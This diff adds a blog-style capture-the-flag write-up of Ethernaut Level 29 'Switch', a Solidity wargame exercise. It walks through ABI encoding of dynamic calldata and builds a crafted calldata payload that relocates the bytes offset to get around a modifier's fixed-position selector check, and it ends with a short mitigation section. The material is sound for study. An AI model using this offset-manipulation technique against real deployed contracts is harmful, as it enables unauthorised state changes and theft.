@@ -1,0 +1,112 @@
+---
+title: Level 29 - Switch
+slug: level-29
+published: 06-10-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut29.svg
+---
+
+## Objectives
+
+1. Flip the switch. Easy right?
+
+## Vulnerabilities
+
+### Assuming positions in `calldata` with dynamic types.
+
+The way _Dynamic types_ are encoded when passed as function arguments is not straightforward. They are encoded in the 
+following sequence:
+
+- 32 bytes for the **offest** value which indicates where the dynamic data starts. For instance, 0x20 (or 32 in decimals) means that
+the dynamic data starts exactly 32 bytes after this field. This allows the fixed-length portion of the function arguments 
+to be densely packed together, saving space.
+
+- 32 bytes of the **length** value which specifies the length of the data. 0x04 means that the bytes argument is 4 bytes long.
+
+- Finally, you have the actual data.
+
+since the **offset** and **length** vary, you can't assume specific position in the `calldata`. This could
+be exploited.
+
+
+## Exploit
+
+it's quite straightforward to see that we want to call `flipSwitch` with some data in a way for `turnSwitchOn` 
+to be called by the contract itself. Let's investigate deeper.
+
+`flipSwitch` has the function modifier `onlyOff` which is the following:
+
+```solidity
+modifier onlyOff() {
+    // we use a complex data type to put in memory
+    bytes32[1] memory selector;
+    // check that the calldata at position 68 (location of _data)
+    assembly {
+        calldatacopy(selector, 68, 4) // grab function selector from calldata
+    }
+    require(
+        selector[0] == offSelector,
+        "Can only call the turnOffSwitch function"
+    );
+    _;
+}
+```
+
+The inline assembly assigns the selector variable to the value of the 4 bytes starting at the 68th byte in the `calldata`.
+The `require`function needs those 4 bytes to be the function selector of `turnSwitchOff`. If we can somehow create a 
+`calldata` that has `turnSwitchOff` at the 68th bytes while also having the `turnSwitchOn` function selector, we could 
+probably exploit the contract.
+
+1. Let's find the function selector of  `turnSwitchOff` and `turnSwitchOn`. Let's do this using web3 in the console:
+```javascript
+const offSelector = web3.eth.abi.encodeFunctionSignature("turnSwitchOff()"); 
+// 0x20606e15
+const onSelector = web3.eth.abi.encodeFunctionSignature("turnSwitchOn()"); 
+// 0x76227e12
+```
+
+2. Next since I'm too lazy to look into the docs and figure out by hand how calling `flipSwitch` with an argument is encoded
+into, let's log it out in the console using web3 again.
+
+
+```javascript
+const calldata = web3.eth.abi.encodeFunctionCall({
+  name: 'flipSwitch',
+  type: 'function',
+  inputs: [{ type: 'bytes', name: '_data' }]
+}, [offSelector]);
+// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000
+```
+
+Let's make sense of this byte array monster using what we know about dynamic and a trusty <a target="\_blank" rel="noopener noreferrer" hre="https://wordcounter.net/character-count">character counter</a>.
+
+`0x` Doesn't count, it just indicates we are dealing in bytes.
+`30c13ade` 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.
+`0000000000000000000000000000000000000000000000000000000000000020` 32 bytes representing a 32 (0x20 in decimal) bytes offset.
+`0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value. Only 4 bytes long in this case.
+`20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes.
+
+3. Let's create our own `calldata` with `offSelector` at the 68th byte but let's tell the EVM to look for the value 
+of the argument elsewhere and we will point it to the value of `onSelector`.
+
+`0x` Doesn't count, it just indicates we are dealing in bytes.
+`30c13ade` Same 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.
+`0000000000000000000000000000000000000000000000000000000000000060` 32 bytes representing a 96 (0x60 in decimal) bytes offset. This is how
+we exploit the `onlyOff` function modifier.
+`0000000000000000000000000000000000000000000000000000000000000000` Some extra bytes that we introduces with the new padding.
+`20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes. 
+It is still at the 68th byte and so the `onlyOff` require function will be happy.
+`0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value which is 4.
+`76227e1200000000000000000000000000000000000000000000000000000000` 32 bytes which is the `onSelector` right padded with zeroes.
+
+4. All that is left is to call `flipSwitch` with the listed byte strings concatenated into a giant one.
+
+## Suggested mitigation
+
+1. Adding additionnal verification in the `calldata` could help prevent this but I would suggest to avoid
+relying on low level call like this when it's not necessary.
+
+## Further reading
+
+- Solidity docs on ABI encoding <ExternalLink href={"https://docs.soliditylang.org/en/develop/abi-spec.html"} />
+- Character counter tool <ExternalLink href={"https://wordcounter.net/character-count"} />
